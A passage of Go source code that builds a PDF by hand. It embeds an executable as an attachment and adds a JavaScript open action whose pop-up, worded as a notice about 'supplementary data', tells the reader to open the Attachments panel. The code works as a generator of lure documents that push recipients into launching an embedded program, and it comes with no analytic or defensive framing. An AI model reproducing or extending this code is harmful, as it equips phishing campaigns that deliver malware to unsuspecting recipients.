	pdf.WriteString(fmt.Sprintf("7 0 obj\n<< /EmbeddedFiles << /Names [(%s) << /Type /Filespec /F (%s) /EF << /F 6 0 R >> >>] >> >>\nendobj\n",
		exeName, exeName))

	// Object 8: JavaScript OpenAction (prompt to open attachment)
	jsCode := `app.alert("This document contains supplementary data.\\nPlease check the Attachments panel to access the data file.", 3, 0, "Notice");`
	offsets = append(offsets, pdf.Len())
	pdf.WriteString(fmt.Sprintf("8 0 obj\n<< /Type /Action /S /JavaScript /JS (%s) >>\nendobj\n", jsCode))

	// Cross-reference table
	xrefOffset := pdf.Len()
	pdf.WriteString("xref\n")
	pdf.WriteString(fmt.Sprintf("0 %d\n", len(offsets)+1))
	pdf.WriteString("0000000000 65535 f \n")
	for _, off := range offsets {
		pdf.WriteString(fmt.Sprintf("%010d 00000 n \n", off))
	}

	// Trailer
	pdf.WriteString(fmt.Sprintf("trailer\n<< /Size %d /Root 1 0 R >>\n", len(offsets)+1))
	pdf.WriteString(fmt.Sprintf("startxref\n%d\n%%%%EOF\n", xrefOffset))

	return os.WriteFile(outPath, []byte(pdf.String()), 0644)
}

func padRight(s string, n int) []byte {
	b := make([]byte, n)
	for i := range b { b[i] = ' ' }
	copy(b, s)
	return b
}

